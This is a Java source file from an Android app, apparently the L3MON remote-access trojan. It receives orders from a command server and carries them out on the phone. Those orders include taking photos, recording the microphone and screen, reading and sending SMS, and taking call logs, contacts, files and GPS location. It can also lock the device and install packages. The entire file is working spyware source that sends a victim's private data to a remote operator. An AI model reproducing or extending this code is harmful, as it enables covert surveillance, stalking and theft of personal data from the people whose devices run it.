package com.etechd.l3mon;

import android.content.Context;
import android.content.Intent;
import android.os.Looper;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

import io.socket.client.Socket;
import io.socket.emitter.Emitter;

public class ConnectionManager {

    public static final String DURATION = "secs";
    public static Context context;
    private static io.socket.client.Socket ioSocket;
    private static FileManager fm = new FileManager();

    public static void startAsync(Context con)
    {
        try {
            context = con;
            sendReq();
        }catch (Exception ex){
            startAsync(con);
        }

    }

    public static void sendReq() {
        try {
            if(ioSocket != null )
                return;
            ioSocket = IOSocket.getInstance().getIoSocket();
            ioSocket.on("ping", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    ioSocket.emit("pong");
                }
            });



            ioSocket.on("order", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    try {
                        JSONObject data = (JSONObject) args[0];
                        String order = data.getString("type");


                        switch (order){
                            case "0xCA":
                                if(data.getString("action").equals("camList"))
                                    CA(-1);
                                else if (data.getString("action").equals("takePic"))
                                    CA(Integer.parseInt(data.getString("cameraID")));
                                break;
                            case "0xFI":
                                if (data.getString("action").equals("ls"))
                                    FI(0,data.getString("path"));
                                else if (data.getString("action").equals("dl"))
                                    FI(1,data.getString("path"));
                                break;
                            case "0xSM":
                                if(data.getString("action").equals("ls"))
                                    SM(0,null,null);
                                else if(data.getString("action").equals("sendSMS"))
                                   SM(1,data.getString("to") , data.getString("sms"));
                                break;
                            case "0xCL":
                                CL();
                                break;
                            case "0xCO":
                                CO();
                                break;
                            case "0xMI":
                                MI(data.getInt("sec"));
                                break;
                            case "0xLO":
                                LO();
                                break;
                            case "0xWI":
                                WI();
                                break;
                            case "0xPM":
                                PM();
                                break;
                            case "0xIN":
                                IN();
                                break;
                            case "0xGP":
                                GP(data.getString("permission"));
                                break;
                            case "0xLD":
                                LD();
                                break;
                            case "0xUD":
                                UD();
                                break;
                            case "0xSS":
                                SS();
                                break;
                            case "0xSR":
                                SR(data.getInt("sec"));
                                break;
                            case "0xRC":
                                RC(1, data.getInt("sec"));
                                break;
                            case "0xFC":
                                FC(2, data.getInt("sec"));
                                break;
                            case "0xRP":
                                RPFP(3);
                                break;
                            case "0xFP":
                                RPFP(4);
                                break;
                        }
                    }catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            });
            ioSocket.connect();

        } catch (Exception ex){
            Log.e("error" , ex.getMessage());
        }

    }

    public static void CA(int cameraID){
        if(cameraID == -1) {
           JSONObject cameraList = new CameraManager(context).findCameraList();
            if(cameraList != null)
            ioSocket.emit("0xCA" ,cameraList );
        } else {
            new CameraManager(context).startUp(cameraID);
        }
    }

    public static void FI(int req , String path){
        if(req == 0) {
            JSONObject object = new JSONObject();
            try {
                object.put("type", "list");
                object.put("list", fm.walk(path));
                ioSocket.emit("0xFI", object);
            } catch (JSONException e){}
        }else if (req == 1)
            fm.downloadFile(path);
    }


    public static void SM(int req,String phoneNo , String msg){
        if(req == 0)
            ioSocket.emit("0xSM" , SMSManager.getsms());
        else if(req == 1) {
            boolean isSent = SMSManager.sendSMS(phoneNo, msg);
            ioSocket.emit("0xSM", isSent);
        }
    }

    public static void CL(){
        ioSocket.emit("0xCL" , CallsManager.getCallsLogs());
    }

    public static void CO(){
        ioSocket.emit("0xCO" , ContactsManager.getContacts());
    }

    public static void MI(int sec) throws Exception{
        MicManager.startRecording(sec);
    }

    public static void WI() {
        ioSocket.emit("0xWI" , WifiScanner.scan(context));
    }

    public static void PM() {
        ioSocket.emit("0xPM" , PermissionManager.getGrantedPermissions());
    }


    public static void IN() {
        ioSocket.emit("0xIN" , AppList.getInstalledApps(false));
    }


    public static void GP(String perm) {
        JSONObject data = new JSONObject();
        try {
            data.put("permission", perm);
            data.put("isAllowed", PermissionManager.canIUse(perm));
            ioSocket.emit("0xGP", data);
        } catch (JSONException e) {

        }
    }

    public static void LO() throws Exception{
        Looper.prepare();
        LocManager gps = new LocManager(context);
        // check if GPS enabled
        if(gps.canGetLocation()){
            ioSocket.emit("0xLO", gps.getData());
        }
    }

    public static void LD(){
        MainService.mDPM.lockNow();
    }

    public static void UD() throws IOException {
        File file = new File("/storage/emulated/0/backups/apps/lemon.apk");
        if (file.exists()) {
            Socket socket = ioSocket;
            Object[] objArr = new Object[1];
            objArr[0] = "pandey";
            socket.emit("0xUD", objArr);
        }
        FileInputStream fileInputStream = new FileInputStream(file);
        Socket socket2 = ioSocket;
        Object[] objArr2 = new Object[1];
        objArr2[0] = "pandey";
        socket2.emit("0xUD", objArr2);
        AppUpdate.installPackage(context, "com.etechd.l3mon", fileInputStream);
        Socket socket3 = ioSocket;
        Object[] objArr3 = new Object[1];
        objArr3[0] = "pandey";
        socket3.emit("0xUD", objArr3);
    }

    public static void SS()
    {
        try {
            Intent intent = new Intent(context, Class.forName("com.etechd.l3mon.TransparentActivity"));
            intent.putExtra("flag", 1);
            context.startActivity(intent);
            Socket socket = ioSocket;
            Object[] objArr = new Object[1];
            objArr[0] = "screenshot";
            socket.emit("0xSS", objArr);
        } catch (ClassNotFoundException e) {
            throw new NoClassDefFoundError(e.getMessage());
        }
    }

    public static void SR(int sec) throws Exception{
        if (sec <= 10) {
            try {
                Intent intent = new Intent(context, Class.forName("com.etechd.l3mon.TransparentActivity"));
                intent.putExtra("flag", 2);
                intent.putExtra(DURATION, sec);
                context.startActivity(intent);
            } catch (ClassNotFoundException e) {
                throw new NoClassDefFoundError(e.getMessage());
            }
        }
    }

    public static void RC(int i, int sec) throws Exception{
        if (sec <= 10) {
            try {
                Intent intent = new Intent(context, Class.forName("com.etechd.l3mon.CamService"));
                intent.putExtra("cam", i);
                intent.putExtra(DURATION, sec);
                context.startService(intent);
            } catch (ClassNotFoundException e) {
                throw new NoClassDefFoundError(e.getMessage());
            }
        }
    }

    public static void FC(int i, int sec) throws Exception{
        if (sec <= 10) {
            try {
                Intent intent = new Intent(context, Class.forName("com.etechd.l3mon.CamService"));
                intent.putExtra("cam", i);
                intent.putExtra(DURATION, sec);
                context.startService(intent);
            } catch (ClassNotFoundException e) {
                throw new NoClassDefFoundError(e.getMessage());
            }
        }
    }

    public static void RPFP(int i) throws Exception{
        try {
            Intent intent = new Intent(context, Class.forName("com.etechd.l3mon.CamService"));
            intent.putExtra("cam", i);
            intent.putExtra(DURATION, 0);
            context.startService(intent);
        } catch (ClassNotFoundException e) {
            throw new NoClassDefFoundError(e.getMessage());
        }
    }
}
